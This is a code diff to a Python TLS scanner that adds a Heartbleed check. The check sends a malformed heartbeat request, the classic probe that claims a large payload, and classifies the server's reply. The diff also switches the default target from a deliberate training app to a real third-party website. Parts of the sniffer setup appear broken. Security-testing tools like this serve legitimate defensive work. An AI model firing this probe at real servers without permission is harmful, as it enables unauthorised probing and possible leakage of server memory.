@@ -189,6 +189,7 @@ import socket, sys, os, ssl
 import logging
 import warnings
 import asyncio
+import binascii
 
 from OpenSSL import SSL
 
@@ -724,23 +725,35 @@ class TLSscanner():
 		
 		# https://encryptorium.medium.com/the-heartbleed-vulnerability-cve-2014-0160-69eb175cafa7
 		def check_heartbleed(self):
-			
 			context = SSL.Context(SSL.TLSv1_2_METHOD)  # Use TLSv1.2 for security
 			context.set_verify(SSL.VERIFY_NONE, lambda *args: True)
 			self.connect(ssl_context=context)
-			sniffer = AsyncSniffer(prn=lambda x: x.show(), iface="en0", store=False, session=TLSSession, filter=f"src host {self.target} or dst host port {self.target}", timeout=10)
+			sniffer = AsyncSniffer(prn=lambda x: self.check_heartbeat_response(x), iface="lo0", store=False, filter=f"{self.port}", stop_filter= lambda x: (x.haslayer(TCP) and (x[TCP].flags == 20 or x[TCP].flags == 11)), timeout=10, session=TLSSession)
 			sniffer.start()
-			self.ssl_handshake()
-			hb_pk = TLS(version=771, type=22, msg=[]) / TLS_Ext_Heartbeat(heartbeat_mode=1)
-			self.ssl_sock.send(bytes(hb_pk))
-			try:
-				response = self.ssl_sock.recv(1024)
-				print(response.decode())
-				sniffer.stop()
-			except SSL.ZeroReturnError:
-				print("Connection close received, Heartbleed likely not possible")
-				return
+			ch_pk = self.craft_clientHello(sn=False)
+			self.send(ch_pk)
+			time.sleep(0.3)
+			hb_pk = self.h2bin('18 03 03 00 03 01 40 00')
+			self.send(hb_pk)
+			time.sleep(3)
+			sniffer.join()
 		
+		def check_heartbeat_response(self, pk):
+			if pk.haslayer(Raw):
+				pk.show()
+				if pk[Raw].load.startswith(b'\x18'):
+					print(f"Heartbeat response received")
+					self.close_socket()
+				elif pk[Raw].load.startswith(b'\x15'):
+					print(f"Alert received, Heartbleed likely not possible")
+					self.close_socket()
+			
+			elif(pk.haslayer(TCP) and (pk[TCP].flags == 20 or pk[TCP].flags == 11)):
+				pk.show()
+				print(f"Connection close received, Heartbleed likely not possible")
+				self.close_socket()
+			else:
+				pass
 
 		def ssl_handshake(self):
 			try:
@@ -757,11 +770,11 @@ class TLSscanner():
 					exit(1)
 
 
-		def craft_clientHello(self, version=771, cipher=None, groups=SUPP_CV_GROUPS_test, sign_algs=SIGN_ALGS, pubkeys=None, pskkxmodes=1, ocsp_status_req=None, renego_info=False):
+		def craft_clientHello(self, version=771, cipher=None, groups=SUPP_CV_GROUPS_test, sign_algs=SIGN_ALGS, pubkeys=None, pskkxmodes=1, ocsp_status_req=None, sn=True, renego_info=False):
 				
 			try:
 				ch_pk = TLS(version=version, type=22, msg=[TLSClientHello(version=(771 if version>771 else version), ciphers=(cipher if cipher else ciphers[version]), random_bytes=os.urandom(32), ext=[ \
-										TLS_Ext_ServerName(servernames=[ServerName(nametype=0, servername=self.target.encode('utf-8'))]), TLS_Ext_SupportedGroups(groups=groups if groups else self.groups), \
+										(TLS_Ext_ServerName(servernames=[ServerName(nametype=0, servername=(self.target.encode('utf-8')))]) if sn else []), TLS_Ext_SupportedGroups(groups=groups if groups else self.groups), \
 										TLS_Ext_SignatureAlgorithms(sig_algs=(sign_algs if sign_algs else self.sign_algs)), TLS_Ext_SupportedVersion_CH(versions=[version]), \
 										TLS_Ext_PSKKeyExchangeModes(kxmodes=[pskkxmodes]), TLS_Ext_SupportedPointFormat(ecpl=[0], type=11, len=2, ecpllen=1), \
 										TLS_Ext_EncryptThenMAC(), TLS_Ext_ExtendedMasterSecret(), \
@@ -828,8 +841,9 @@ class TLSscanner():
 
 			return pubks_list
 		
-		def create_verify_data(self, srv_done):
-			pass
+		def h2bin(self, x):
+			return binascii.unhexlify(x.replace(' ', '').replace('\n', ''))
+
 			
 			
 		def get_curve(self, curve_name):
@@ -878,7 +892,7 @@ class TLSscanner():
 
 
 if __name__ == "__main__":
-	scanner = TLSscanner(target="juice-shop.herokuapp.com")
+	scanner = TLSscanner(target="www.acmilan.com")
 	scanner.scan()
 
 
